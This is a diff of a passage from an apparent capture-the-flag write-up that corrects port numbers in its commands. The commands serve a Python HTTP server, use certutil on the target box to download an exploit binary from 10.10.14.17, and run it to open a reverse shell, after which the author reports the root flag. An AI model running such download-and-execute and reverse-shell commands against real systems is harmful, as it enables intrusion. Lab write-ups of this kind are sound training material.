@@ -25,14 +25,14 @@ To do so, I utilized a local server to send the file over to the box.
 
 ```bash
 # on my machine in a directory with the payload
-python3 -m http.server <42068>
+python3 -m http.server 42068
 
 # on the box
 certutil -urlcache -f "http://10.10.14.17:42068/Chimichurri.exe" Chimichurri.exe
 
 # running the exploit
 
-Chimichurri.exe 10.10.14.17 4444
+Chimichurri.exe 10.10.14.17 42068
 
 ```
 I was able to obtain a reverse shell from this exploit, and from there, I navigated to the root flag, 82070982e2673deff31aa84282303a18, and pwned the box!
